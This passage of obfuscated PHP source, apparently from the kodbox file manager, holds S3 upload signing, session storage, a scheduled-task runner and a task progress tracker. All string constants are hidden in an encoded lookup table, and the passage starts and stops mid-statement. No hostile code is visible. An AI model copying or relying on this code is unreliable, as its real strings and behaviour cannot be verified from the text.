x48\xb9\x5e\x93\x1d\xf\x31\xfc\x98\x96\x66\x8a\x21\xe9\x9c\x41\xcf\x8\xaf\xac\x22\x8f\x53\xdf\x25\x8f\xbf\xc5\xdc\x27\xf3\x80\xf3\x35\x41\x97\xd9\x2c\x23\x6c\x28"."\x8\x5b\xdd\xb5\x42\xd9\xd1\x1c\x40\xf1\x83\x30\x9c\x3f\x70\x39\x5f\x98\x7a\xf8\x1c\x26\x21\x12\x9c\xcc\x21\xc2\x94\x24\xda\x94\xd7\x7b\x2\x98\x5e\xb2\x83\xe4\x73\x87\xe2\x33\x31\x92\x2a\x3a\x0\x57\xec\x78"."\63\101\43\153\315\204\164\346\105\167\131\160\377\34\272\124\262\254\244\141\107\262\255\365\224\264\214\240\352\144\314\45\204\242\367\377\0\163\35\26\152\254\270\0\0".base64_decode('')."".""."", 10, -8))); goto aƒÆ¿…µ·Ç; eº´ìà›Õï: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¥êä´­Ú) { parent::__construct($¥êä´­Ú); } public function uploadFormData($ÉÂ‘ÔÑô, $çì’øÁ = 3600) { $Œ‘òçŒÆ =& $_SERVER[Ş­ğŠìÒ]; $Ü µİØô = $Œ‘òçŒÆ[229]; $éªŠôÍØ = $Œ‘òçŒÆ[270]; $Ê„¢ç€Ñ = $Œ‘òçŒÆ[62]; $É™‡øì‡ = gmdate($Œ‘òçŒÆ[271]); $éñíâøñ = gmdate($Œ‘òçŒÆ[272]); $Œƒ‚™íš = $Œ‘òçŒÆ[273]; $ÀÀ¼á‡£ = $çì’øÁ . $Œ‘òçŒÆ[12]; $ÆÍçëİ = $Œ‘òçŒÆ[274]; $Ùâì¨û = array($this->accessKey, $éñíâøñ, $this->region, $Ê„¢ç€Ñ, $Œƒ‚™íš); $åà¶Ì–š = implode($Œ‘òçŒÆ[8], $Ùâì¨û); $úúø÷Éø = array($Œ‘òçŒÆ[275] => gmdate($Œ‘òçŒÆ[299], strtotime($Œ‘òçŒÆ[277])), $Œ‘òçŒÆ[278] => array(array($Œ‘òçŒÆ[279] => $this->bucket), array($Œ‘òçŒÆ[280] => $Ü µİØô), array($Œ‘òçŒÆ[281], $Œ‘òçŒÆ[282], $Œ‘òçŒÆ[12]), array($Œ‘òçŒÆ[281], $Œ‘òçŒÆ[283], $Œ‘òçŒÆ[12]), array($Œ‘òçŒÆ[281], $Œ‘òçŒÆ[284], $Œ‘òçŒÆ[12]), array($Œ‘òçŒÆ[285] => $ÆÍçëİ), array($Œ‘òçŒÆ[286] => $åà¶Ì–š), array($Œ‘òçŒÆ[287] => $éªŠôÍØ), array($Œ‘òçŒÆ[288] => $É™‡øì‡), array($Œ‘òçŒÆ[289] => $ÀÀ¼á‡£))); $œÊŞ®ÁÂ = base64_encode(json_encode($úúø÷Éø)); $ç©†´ß = hash_hmac($Œ‘òçŒÆ[290], $éñíâøñ, $Œ‘òçŒÆ[291] . $this->secret, !0); $ÛÔ¯¢ = hash_hmac($Œ‘òçŒÆ[290], $this->region, $ç©†´ß, !0); $ŠƒÂ–ì = hash_hmac($Œ‘òçŒÆ[290], $Ê„¢ç€Ñ, $ÛÔ¯¢, !0); $¢À€ıë = hash_hmac($Œ‘òçŒÆ[290], $Œƒ‚™íš, $ŠƒÂ–ì, !0); $Åâ˜‰ô = hash_hmac($Œ‘òçŒÆ[290], $œÊŞ®ÁÂ, $¢À€ıë); $°Ìùµ®Á = array($Œ‘òçŒÆ[246] => $Œ‘òçŒÆ[12], $Œ‘òçŒÆ[292] => $Œ‘òçŒÆ[12], $Œ‘òçŒÆ[280] => $Ü µİØô, $Œ‘òçŒÆ[285] => $ÆÍçëİ, $Œ‘òçŒÆ[293] => $œÊŞ®ÁÂ, $Œ‘òçŒÆ[294] => $åà¶Ì–š, $Œ‘òçŒÆ[295] => $éªŠôÍØ, $Œ‘òçŒÆ[296] => $É™‡øì‡, $Œ‘òçŒÆ[297] => $ÀÀ¼á‡£, $Œ‘òçŒÆ[298] => $Åâ˜‰ô, $Œ‘òçŒÆ[208] => $this->getHost()); return $°Ìùµ®Á; } public function multiUploadFormData($İìé˜ãÚ, $÷ ĞÑŞı = 3600) { $ö´Ù‚Ğ¤ =& $_SERVER[Ş­ğŠìÒ]; $‰¶›ÔÛ“ = gmdate($ö´Ù‚Ğ¤[300]); $Ã…¶œºÖ = array(); $æÉ‘Í¹š = $this->client->getUploadId($this->bucket, $İìé˜ãÚ, $Ã…¶œºÖ); if (!$æÉ‘Í¹š) { return !1; } return array($ö´Ù‚Ğ¤[254] => $æÉ‘Í¹š, $ö´Ù‚Ğ¤[208] => $this->getHost() . $ö´Ù‚Ğ¤[8] . $this->pathEncode($İìé˜ãÚ), $ö´Ù‚Ğ¤[255] => $‰¶›ÔÛ“, $ö´Ù‚Ğ¤[97] => $İìé˜ãÚ); } public function multiUploadAuthData($ÚÎå£„Õ, $ –“Õ° = array()) { $œÅ†²Îé =& $_SERVER[Ş­ğŠìÒ]; $ö™—€ø· = isset($ –“Õ°[$œÅ†²Îé[169]]) ? $ –“Õ°[$œÅ†²Îé[169]] : $œÅ†²Îé[12]; $¯‡ÏÑ”› = $ –“Õ°[$œÅ†²Îé[97]]; unset($ –“Õ°[$œÅ†²Îé[97]]); if (isset($ –“Õ°[$œÅ†²Îé[256]])) { return $this->listUploadParts($¯‡ÏÑ”›, $ –“Õ°); } $Ìö§¢Ñ = array(); if (isset($ –“Õ°[$œÅ†²Îé[301]])) { $Ìö§¢Ñ[$œÅ†²Îé[302]] = $ –“Õ°[$œÅ†²Îé[301]]; } $âù’¢·Ä = explode($œÅ†²Îé[210], $this->getHost()); $ª¹Äµ€ª = array($œÅ†²Îé[303] => $âù’¢·Ä[1], $œÅ†²Îé[304] => $œÅ†²Îé[12], $œÅ†²Îé[246] => $œÅ†²Îé[123], $œÅ†²Îé[292] => $ –“Õ°[$œÅ†²Îé[79]]); $¢Şã”“Ò = $œÅ†²Îé[259]; $æ°’Å£ä = $œÅ†²Îé[8] . $this->pathEncode($¯‡ÏÑ”›) . $ö™—€ø·; $üÉÉ¬ÌÔ = $this->client->__getSignatureV4($Ìö§¢Ñ, $ª¹Äµ€ª, $¢Şã”“Ò, $æ°’Å£ä); if (strpos($ö™—€ø·, $œÅ†²Îé[258]) === 0) { if (isset($Ìö§¢Ñ[$œÅ†²Îé[302]])) { $»—û¥¥é = $Ìö§¢Ñ[$œÅ†²Îé[302]]; } else { if (isset($üÉÉ¬ÌÔ[$œÅ†²Îé[302]])) { $»—û¥¥é = $üÉÉ¬ÌÔ[$œÅ†²Îé[302]]; } else { $»—û¥¥é = hash($œÅ†²Îé[290], $œÅ†²Îé[12]); } } return array($œÅ†²Îé[265] => $üÉÉ¬ÌÔ[$œÅ†²Îé[265]], $œÅ†²Îé[302] => $»—û¥¥é, $œÅ†²Îé[255] => $üÉÉ¬ÌÔ[$œÅ†²Îé[305]]); } return $üÉÉ¬ÌÔ[$œÅ†²Îé[265]]; } public function listUploadParts($òü‚Ÿüƒ, $—ÎÂßğÅ = array()) { $µÄ‰óÁº =& $_SERVER[Ş­ğŠìÒ]; $Íşå€ÆÑ = str_replace($µÄ‰óÁº[266], $µÄ‰óÁº[12], $—ÎÂßğÅ[$µÄ‰óÁº[169]]); $‘ºá¾Ç‰ = $this->client->listParts($this->bucket, $òü‚Ÿüƒ, $Íşå€ÆÑ); if (!$‘ºá¾Ç‰) { return !1; } $ÍØÀÀä­ = $µÄ‰óÁº[306]; foreach ($‘ºá¾Ç‰ as $Û¹¡î²œ) { $ÍØÀÀä­ .= $µÄ‰óÁº[307] . "\x3c\120\141\x72\x74\x4e\x75\x6d\x62\x65\162\76{$Û¹¡î²œ[$µÄ‰óÁº[308]]}\x3c\x2f\120\x61\162\x74\x4e\x75\x6d\x62\145\x72\x3e\xa" . "\x3c\x45\x54\141\147\x3e{$Û¹¡î²œ[$µÄ‰óÁº[309]]}\x3c\57\105\124\x61\x67\76\xa" . $µÄ‰óÁº[310]; } $ÍØÀÀä­ .= $µÄ‰óÁº[311]; $ãèİ´ÕÊ = array(); $¥»¥ëóÚ = explode($µÄ‰óÁº[210], $this->getHost()); $Ìâõ¨§º = array($µÄ‰óÁº[303] => $¥»¥ëóÚ[1], $µÄ‰óÁº[246] => $µÄ‰óÁº[123], $µÄ‰óÁº[292] => strlen($ÍØÀÀä­)); $èÑØ´¹ = $µÄ‰óÁº[257]; $«Şáëòš = $µÄ‰óÁº[8] . $this->pathEncode($òü‚Ÿüƒ) . $—ÎÂßğÅ[$µÄ‰óÁº[169]]; $Íş¦€ª¯ = $this->client->__getSignatureV4($ãèİ´ÕÊ, $Ìâõ¨§º, $èÑØ´¹, $«Şáëòš, $ÍØÀÀä­); return array($µÄ‰óÁº[265] => $Íş¦€ª¯[$µÄ‰óÁº[265]], $µÄ‰óÁº[255] => $Íş¦€ª¯[$µÄ‰óÁº[305]], $µÄ‰óÁº[267] => $‘ºá¾Ç‰, $µÄ‰óÁº[302] => $Íş¦€ª¯[$µÄ‰óÁº[302]]); } public function link($¾ºˆ¢È¾, $ÎÁ×´øŸ = array()) { return parent::link($¾ºˆ¢È¾, $ÎÁ×´øŸ); } public function fileOut($´×î†ö, $«à›¢Çõ = false, $…™Ê¸¼¹ = false, $İöÔ‹ôñ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ş­ğŠìÒ][312])) { return parent::fileOutServer($´×î†ö, $«à›¢Çõ, $…™Ê¸¼¹, $İöÔ‹ôñ); } parent::fileOut($´×î†ö, $«à›¢Çõ, $…™Ê¸¼¹, $İöÔ‹ôñ); } public function fileOutImage($¾»”‚—õ, $Íäå‘¬û = 250) { if (strstr($this->endpoint, $_SERVER[Ş­ğŠìÒ][312])) { return parent::fileOutImageServer($¾»”‚—õ, $Íäå‘¬û); } parent::fileOutImage($¾»”‚—õ, $Íäå‘¬û); } public function fileOutLink($ÚÛú…Í‡) { $«ÙÑÖÀ³ =& $_SERVER[Ş­ğŠìÒ]; if (substr($ÚÛú…Í‡, 0, 7) == $«ÙÑÖÀ³[313]) { $ÚÛú…Í‡ = $«ÙÑÖÀ³[314] . substr($ÚÛú…Í‡, 7); } header($«ÙÑÖÀ³[175] . $ÚÛú…Í‡); die; } } define($_SERVER[Ş­ğŠìÒ][315], 1); define($_SERVER[Ş­ğŠìÒ][316], 2); goto eç´½é‚¬; D¡¼Œß•ö: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¾×¿Şîô =& $_SERVER[Ş­ğŠìÒ]; static $º¤Á†Ü = false; if ($º¤Á†Ü) { return $º¤Á†Ü; } $ÃÉàÙ¾ = $GLOBALS[$¾×¿Şîô[6]][$¾×¿Şîô[425]]; self::$sessionTime = $ÃÉàÙ¾[$¾×¿Şîô[1710]]; $ÏÃô¯µ = isset($GLOBALS[$¾×¿Şîô[1711]]) ? $GLOBALS[$¾×¿Şîô[1711]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ÏÃô¯µ)) { self::$sessionSign = Cookie::get($ÏÃô¯µ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ÏÃô¯µ, self::$sessionSign, self::$sessionTime); $Í¹Î¡¶Î = $ÃÉàÙ¾[$¾×¿Şîô[1712]]; $¤”æïˆõ = $ÃÉàÙ¾[$Í¹Î¡¶Î]; $¹÷³™İË = $ÃÉàÙ¾[$¾×¿Şîô[894]]; switch ($Í¹Î¡¶Î) { case $¾×¿Şîô[21]: self::$handle = Model($¾×¿Şîô[895]); break; case $¾×¿Şîô[896]: self::$handle = new CacheRedis($¤”æïˆõ, $¹÷³™İË); break; case $¾×¿Şîô[897]: self::$handle = new CacheMemcached($¤”æïˆõ, $¹÷³™İË); break; case $¾×¿Şîô[230]: $¤”æïˆõ[$¾×¿Şîô[87]] = $¤”æïˆõ[$¾×¿Şîô[87]] . $¾×¿Şîô[1713]; self::$handle = new CacheFile($¤”æïˆõ, $¹÷³™İË); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $º¤Á†Ü = new self(); return $º¤Á†Ü; } public static function getBySign($ ‹ÒûÁ) { $±×ƒî‹Ô = self::$handle->get($ ‹ÒûÁ); $±×ƒî‹Ô = unserialize($±×ƒî‹Ô); return is_array($±×ƒî‹Ô) ? $±×ƒî‹Ô : array(); } public static function setBySign($ƒæé²şÌ, $¤åö‘£) { CacheLock::lock($ƒæé²şÌ); self::$handle->set($ƒæé²şÌ, serialize($¤åö‘£), self::$sessionTime); CacheLock::unlock($ƒæé²şÌ); } public static function sign($ºÒ€ŠÛ­ = false) { if ($ºÒ€ŠÛ­) { self::$sessionSign = $ºÒ€ŠÛ­; } self::init(); return self::$sessionSign; } public static function set($Ì¢½ê‹, $êù¹ª¯ü = false) { self::init(); if (is_array($Ì¢½ê‹)) { foreach ($Ì¢½ê‹ as $¸£üğ­ş => $ÙıÓ­š÷) { array_set_value(self::$data, $¸£üğ­ş, $ÙıÓ­š÷); } } else { array_set_value(self::$data, $Ì¢½ê‹, $êù¹ª¯ü); } self::setBySign(self::$sessionSign, self::$data); } public static function get($¾ù§¸ÄÍ = false) { self::init(); if (!$¾ù§¸ÄÍ) { return self::$data; } return array_get_value(self::$data, $¾ù§¸ÄÍ); } public static function remove($Íøœ€ÜÖ) { self::init(); unset(self::$data[$Íøœ€ÜÖ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ş­ğŠìÒ][900])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ƒºÃ—Æû =& $_SERVER[Ş­ğŠìÒ]; if (self::valueGet($ƒºÃ—Æû[817]) != $ƒºÃ—Æû[91]) { return; } if (self::valueGet($ƒºÃ—Æû[1714]) == $ƒºÃ—Æû[91]) { $šÏ™¥µ° = self::valueGet($ƒºÃ—Æû[1715]); if (time() - $šÏ™¥µ° > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ƒºÃ—Æû[1714], $ƒºÃ—Æû[91]); self::log($ƒºÃ—Æû[1716] . ACTION . $ƒºÃ—Æû[1717]); Hook::bind($ƒºÃ—Æû[1718], $ƒºÃ—Æû[1719]); $™’Ëóš = 0; while (!0) { self::cacheClear(); if (self::valueGet($ƒºÃ—Æû[817]) != $ƒºÃ—Æû[91]) { self::valueSet($ƒºÃ—Æû[1714], $ƒºÃ—Æû[228]); self::log($ƒºÃ—Æû[1720]); die; } $ô‡ïÑ = time(); if ($ô‡ïÑ - $™’Ëóš >= 60) { self::valueSet(array($ƒºÃ—Æû[1714] => $ƒºÃ—Æû[91], $ƒºÃ—Æû[1715] => $ô‡ïÑ)); $™’Ëóš = $ô‡ïÑ; } if (!file_exists(USER_SYSTEM . $ƒºÃ—Æû[1721])) { self::valueSet(array($ƒºÃ—Æû[1714] => $ƒºÃ—Æû[228], $ƒºÃ—Æû[817] => $ƒºÃ—Æû[228])); self::log($ƒºÃ—Æû[1722]); die; } $Ù¹²®³ = file_get_contents(BASIC_PATH . $ƒºÃ—Æû[1723]); $Ÿ”Å‰é = KOD_VERSION . $ƒºÃ—Æû[10] . KOD_VERSION_BUILD; $ÅÛ–ŞÚ‘ = match_text($Ù¹²®³, $ƒºÃ—Æû[1724]) . $ƒºÃ—Æû[10] . match_text($Ù¹²®³, $ƒºÃ—Æû[1725]); if ($ÅÛ–ŞÚ‘ != $Ÿ”Å‰é) { self::restart(); self::log("\163\164\157\x70\145\144\56\x5b\166\x65\162\163\151\157\156\x20\x75\160\144\141\x74\x65\73{$versionNow}\x20\x3d\76\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $‚ÀŸÇî° =& $_SERVER[Ş­ğŠìÒ]; http_close(); $GLOBALS[$‚ÀŸÇî°[1726]] = 1; $_SERVER[$‚ÀŸÇî°[1727]] = $‚ÀŸÇî°[1728]; $_COOKIE = array(); $GLOBALS[$‚ÀŸÇî°[1729]] = 1; $GLOBALS[$‚ÀŸÇî°[1730]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $¾øúÅô =& $_SERVER[Ş­ğŠìÒ]; http_close(); self::valueSet($¾øúÅô[817], $¾øúÅô[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¾øúÅô[1714] => $¾øúÅô[228], $¾øúÅô[817] => $¾øúÅô[91])); self::log($¾øúÅô[1731]); } public static function taskSwitch() { $Ñè¶éú =& $_SERVER[Ş­ğŠìÒ]; $ó°î¨ã = self::valueGet($Ñè¶éú[817]) == $Ñè¶éú[91] ? $Ñè¶éú[228] : $Ñè¶éú[91]; self::valueSet($Ñè¶éú[817], $ó°î¨ã); } public static function shutdownEvent() { $áäÕÊ á =& $_SERVER[Ş­ğŠìÒ]; self::valueSet($áäÕÊ á[1714], $áäÕÊ á[228]); self::log($áäÕÊ á[1732]); } public static function config($›Å„¸Ö‰, $İ‘ğ„Ğí) { self::valueSet($_SERVER[Ş­ğŠìÒ][817], $›Å„¸Ö‰); } private static function taskRunAll() { $®‘Ñ¦ñĞ =& $_SERVER[Ş­ğŠìÒ]; $‰‘€ùëì = timeFloat(); $Š“Ÿ¸ Ú = Model($®‘Ñ¦ñĞ[1733])->listData(); $Ùò”°şİ = count($Š“Ÿ¸ Ú); for ($ íö‘Á = 0; $ íö‘Á < $Ùò”°şİ; $ íö‘Á++) { $š¾‰ñİ— = $Š“Ÿ¸ Ú[$ íö‘Á]; if (!$š¾‰ñİ—[$®‘Ñ¦ñĞ[475]] || $š¾‰ñİ—[$®‘Ñ¦ñĞ[1734]] != $®‘Ñ¦ñĞ[91]) { continue; } if (!self::taskTimeCheck($š¾‰ñİ—)) { continue; } self::taskRun($š¾‰ñİ—); } Hook::trigger($®‘Ñ¦ñĞ[1735]); self::taskQueueRun($‰‘€ùëì); } private static function taskQueueRun($ßıë‹Ä®) { $À˜²ë¿Ö = 10; while (!0) { $ÀĞ¸®Í› = TaskQueue::run(); if ($ÀĞ¸®Í› === !1) { break; } if (timeFloat() - $ßıë‹Ä® >= $À˜²ë¿Ö) { break; } } } private static function taskTimeCheck($·éÏääş) { $“¬›´ÍÊ =& $_SERVER[Ş­ğŠìÒ]; $«›åè¿ = json_decode($·éÏääş[$“¬›´ÍÊ[206]], !0); $‘Œí—ş = intval($·éÏääş[$“¬›´ÍÊ[1715]]); $çÇáğ = strtotime($“¬›´ÍÊ[1736] . $«›åè¿[$“¬›´ÍÊ[1737]] . $“¬›´ÍÊ[1738]) - strtotime($“¬›´ÍÊ[1739]); $¿¹üã€û = time() - strtotime(date($“¬›´ÍÊ[1740]) . $“¬›´ÍÊ[1741]); $ªéâ£Á€ = $¿¹üã€û >= $çÇáğ && $¿¹üã€û <= $çÇáğ + 3600; switch ($«›åè¿[$“¬›´ÍÊ[33]]) { case $“¬›´ÍÊ[1742]: if (time() - $‘Œí—ş < 3600 * 24 * 30) { return !1; } if ($«›åè¿[$“¬›´ÍÊ[1742]] == date($“¬›´ÍÊ[1743]) && $ªéâ£Á€) { return !0; } break; case $“¬›´ÍÊ[1744]: if (time() - $‘Œí—ş < 3600 * 24 * 7) { return !1; } $×îóÍéß = date($“¬›´ÍÊ[1745]) == 0 ? 7 : date($“¬›´ÍÊ[1745]); if ($«›åè¿[$“¬›´ÍÊ[1744]] == $×îóÍéß && $ªéâ£Á€) { return !0; } break; case $“¬›´ÍÊ[1737]: if (time() - $‘Œí—ş < 3600 * 24) { return !1; } if ($ªéâ£Á€) { return !0; } break; case $“¬›´ÍÊ[1746]: if (time() - $‘Œí—ş >= floatval($«›åè¿[$“¬›´ÍÊ[1746]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $£‚ğÌÜ’ =& $_SERVER[Ş­ğŠìÒ]; static $ñ à¹ç  = 0; $üëÓôÓû = 300; if (!$ñ à¹ç ) { $ñ à¹ç  = time(); } if (time() - $ñ à¹ç  < $üëÓôÓû) { return; } $ñ à¹ç  = time(); $èçü¤öº = Model($£‚ğÌÜ’[577])->db($£‚ğÌÜ’[12]); if ($èçü¤öº) { $èçü¤öº->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($£‚ğÌÜ’[1747], $£‚ğÌÜ’[1748]); die; } } public static function taskRun($›ÏˆÆæ¿) { $‹û¹Ö« =& $_SERVER[Ş­ğŠìÒ]; self::log($‹û¹Ö«[1749] . $›ÏˆÆæ¿[$‹û¹Ö«[475]] . $‹û¹Ö«[1750] . $›ÏˆÆæ¿[$‹û¹Ö«[32]] . $‹û¹Ö«[1751] . $›ÏˆÆæ¿[$‹û¹Ö«[1752]]); Model($‹û¹Ö«[1733])->run($›ÏˆÆæ¿[$‹û¹Ö«[475]]); $³İğø¤ˆ = timeFloat(); $‹ãÛ»¬ = $‹û¹Ö«[12]; switch ($›ÏˆÆæ¿[$‹û¹Ö«[33]]) { case $‹û¹Ö«[383]: $ö¢¦š¾ı = url_request($›ÏˆÆæ¿[$‹û¹Ö«[1752]], $‹û¹Ö«[261], !1, !1, !1, !1, 10); if ($ö¢¦š¾ı[$‹û¹Ö«[817]]) { $‹ãÛ»¬ = strlen($ö¢¦š¾ı[$‹û¹Ö«[1283]]); } break; case $‹û¹Ö«[260]: $‹ãÛ»¬ = Hook::apply($›ÏˆÆæ¿[$‹û¹Ö«[1752]]); default: break; } Model($‹û¹Ö«[1753])->add(array($‹û¹Ö«[1754] => $‹û¹Ö«[12], $‹û¹Ö«[1755] => $‹û¹Ö«[228], $‹û¹Ö«[33] => $‹û¹Ö«[1756] . $›ÏˆÆæ¿[$‹û¹Ö«[475]], $‹û¹Ö«[1757] => json_encode(array($‹û¹Ö«[32] => $›ÏˆÆæ¿[$‹û¹Ö«[32]], $‹û¹Ö«[1758] => timeFloat() - $³İğø¤ˆ, $‹û¹Ö«[369] => $‹ãÛ»¬)))); $ŒùŠä“È = $‹ãÛ»¬ ? $‹û¹Ö«[1759] . $‹ãÛ»¬ : $‹û¹Ö«[12]; self::log($‹û¹Ö«[1760] . $›ÏˆÆæ¿[$‹û¹Ö«[475]] . $‹û¹Ö«[178] . $ŒùŠä“È); return !0; } public static function valueGet($ÕÕæÑ‚‹) { $Ğ»®‹·› =& $_SERVER[Ş­ğŠìÒ]; $õ£ŠÙç€ = $Ğ»®‹·›[1761]; $îªÒ„¼ = Model($Ğ»®‹·›[508])->get($ÕÕæÑ‚‹, $õ£ŠÙç€); if (is_null($îªÒ„¼)) { Model($Ğ»®‹·›[508])->set($Ğ»®‹·›[817], $Ğ»®‹·›[91], $õ£ŠÙç€); Model($Ğ»®‹·›[508])->set($Ğ»®‹·›[1714], $Ğ»®‹·›[228], $õ£ŠÙç€); $îªÒ„¼ = Model($Ğ»®‹·›[508])->get($ÕÕæÑ‚‹, $õ£ŠÙç€); } return $îªÒ„¼; } private static function valueSet($·Ô‹¥…, $—¦ÕµìÈ = false) { $¿Ø…¢ºÜ =& $_SERVER[Ş­ğŠìÒ]; $ü•¾šª = $¿Ø…¢ºÜ[1762]; CacheLock::lock($ü•¾šª); $˜¼ÕäÉ” = Model($¿Ø…¢ºÜ[508])->set($·Ô‹¥…, $—¦ÕµìÈ, $¿Ø…¢ºÜ[1761]); CacheLock::unlock($ü•¾šª); return $˜¼ÕäÉ”; } protected static function log($ë˜•ªÇ—) { write_log($ë˜•ªÇ—, $_SERVER[Ş­ğŠìÒ][1748]); } private static function cacheClear() { $’ÎûñÉç =& $_SERVER[Ş­ğŠìÒ]; Cache::clearMemory(Model($’ÎûñÉç[508])->cacheKey($’ÎûñÉç[1761])); Cache::clearMemory(Model($’ÎûñÉç[508])->cacheKey($’ÎûñÉç[1763])); Model($’ÎûñÉç[1733])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\157\x70"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($È­üœĞ, $Üñ¤öÑ = '', $ ¤Ğªíİ = 0, $­Ş†ãş = '') { $«ñ¤Ø‚ =& $_SERVER[Ş­ğŠìÒ]; if (self::get($È­üœĞ)) { return; } $this->task = array($«ñ¤Ø‚[475] => $È­üœĞ, $«ñ¤Ø‚[1764] => USER_ID, $«ñ¤Ø‚[1653] => $­Ş†ãş, $«ñ¤Ø‚[526] => $«ñ¤Ø‚[12], $«ñ¤Ø‚[33] => $Üñ¤öÑ, $«ñ¤Ø‚[1139] => $«ñ¤Ø‚[12], $«ñ¤Ø‚[1137] => $ ¤Ğªíİ, $«ñ¤Ø‚[1765] => 0, $«ñ¤Ø‚[1766] => 0, $«ñ¤Ø‚[1767] => 0, $«ñ¤Ø‚[1768] => timeFloat(), $«ñ¤Ø‚[1769] => 0, $«ñ¤Ø‚[1770] => 0, $«ñ¤Ø‚[1771] => 0, $«ñ¤Ø‚[1772] => 0, $«ñ¤Ø‚[817] => $«ñ¤Ø‚[1714]); $GLOBALS[$«ñ¤Ø‚[1773]] = 1; Hook::bind($«ñ¤Ø‚[1718], array($this, $«ñ¤Ø‚[1774])); Hook::bind($«ñ¤Ø‚[1775], array($this, $«ñ¤Ø‚[1776])); $this->startAfter(); Hook::trigger($«ñ¤Ø‚[1777], $this->task); $this->task[$«ñ¤Ø‚[1770]] = timeFloat(); } public function end($ùî—Íù¸ = '') { $Ñ–¶ÌÂŸ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Ñ–¶ÌÂŸ[1770]]) { self::valueSet($this->task[$Ñ–¶ÌÂŸ[475]], !1); } $this->isEnd = !0; if ($ùî—Íù¸) { $this->task[$Ñ–¶ÌÂŸ[526]] = $ùî—Íù¸; } self::log($Ñ–¶ÌÂŸ[1778] . $this->task[$Ñ–¶ÌÂŸ[475]] . $Ñ–¶ÌÂŸ[1779] . sprintf($Ñ–¶ÌÂŸ[917], timeFloat() - $this->task[$Ñ–¶ÌÂŸ[1768]]) . $Ñ–¶ÌÂŸ[1780]); Hook::unbind($Ñ–¶ÌÂŸ[1718], array($this, $Ñ–¶ÌÂŸ[1774])); Hook::unbind($Ñ–¶ÌÂŸ[1775], array($this, $Ñ–¶ÌÂŸ[1776])); $this->endAfter(); $…÷úŞ—É = $this->task; $this->task = !1; Hook::trigger($Ñ–¶ÌÂŸ[1781], $…÷úŞ—É); } public function update($‹ÁÌ›ÎÈ = 0, $„ãıüñ = false) { $ŞÁÏÁè— =& $_SERVER[Ş­ğŠìÒ]; $Ôğ³¥¶Ş =& $this->task; if (!$Ôğ³¥¶Ş) { return; } $Ôğ³¥¶Ş[$ŞÁÏÁè—[1765]] += $‹ÁÌ›ÎÈ; $Ôğ³¥¶Ş[$ŞÁÏÁè—[1769]] = timeFloat(); if ($Ôğ³¥¶Ş[$ŞÁÏÁè—[1137]]) { if ($Ôğ³¥¶Ş[$ŞÁÏÁè—[1137]] < $Ôğ³¥¶Ş[$ŞÁÏÁè—[1765]]) { $Ôğ³¥¶Ş[$ŞÁÏÁè—[1137]] = $Ôğ³¥¶Ş[$ŞÁÏÁè—[1765]]; } $»ºÉ‰È = timeFloat() - $Ôğ³¥¶Ş[$ŞÁÏÁè—[1768]] - $Ôğ³¥¶Ş[$ŞÁÏÁè—[1771]]; if ($»ºÉ‰È <= 0) { $»ºÉ‰È = 0.001; } $Ôğ³¥¶Ş[$ŞÁÏÁè—[1766]] = $Ôğ³¥¶Ş[$ŞÁÏÁè—[1765]] / $Ôğ³¥¶Ş[$ŞÁÏÁè—[1137]]; $Ôğ³¥¶Ş[$ŞÁÏÁè—[1767]] = $Ôğ³¥¶Ş[$ŞÁÏÁè—[1765]] / $»ºÉ‰È; if ($Ôğ³¥¶Ş[$ŞÁÏÁè—[1766]] > 0) { $Ôğ³¥¶Ş[$ŞÁÏÁè—[1772]] = $»ºÉ‰È * (1 - $Ôğ³¥¶Ş[$ŞÁÏÁè—[1766]]) / $Ôğ³¥¶Ş[$ŞÁÏÁè—[1766]]; } $Ôğ³¥¶Ş[$ŞÁÏÁè—[1772]] = $Ôğ³¥¶Ş[$ŞÁÏÁè—[1772]] <= 0 ? 0 : $Ôğ³¥¶Ş[$ŞÁÏÁè—[1772]]; } $this->updateAfter(); $†…²„ÛË = 0.2; if (timeFloat() - $Ôğ³¥¶Ş[$ŞÁÏÁè—[1770]] < $†…²„ÛË && !$„ãıüñ) { return; } $Òí¹†‘Ş = self::get($Ôğ³¥¶Ş[$ŞÁÏÁè—[475]]); $‘’É¡Å = $Òí¹†‘Ş[$ŞÁÏÁè—[817]]; if ($‘’É¡Å == self::STATYS_KILL) { $ôß«Œ»¤ = array($ŞÁÏÁè—[1782] => LNG($ŞÁÏÁè—[1783]), $ŞÁÏÁè—[1293] => !1); Cache::set($ŞÁÏÁè—[1784] . $this->task[$ŞÁÏÁè—[475]], $ôß«Œ»¤, 30); $this->onKill(); $this->end(); die; } else { if ($‘’É¡Å == self::STATYS_STOP) { $ÎĞ—§Øõ = 2; $Òí¹†‘Ş[$ŞÁÏÁè—[1771]] += $ÎĞ—§Øõ; self::valueSet($Ôğ³¥¶Ş[$ŞÁÏÁè—[475]], $Òí¹†‘Ş); sleep($ÎĞ—§Øõ); $this->update(); return; } } $Ôğ³¥¶Ş[$ŞÁÏÁè—[817]] = $‘’É¡Å ? $‘’É¡Å : 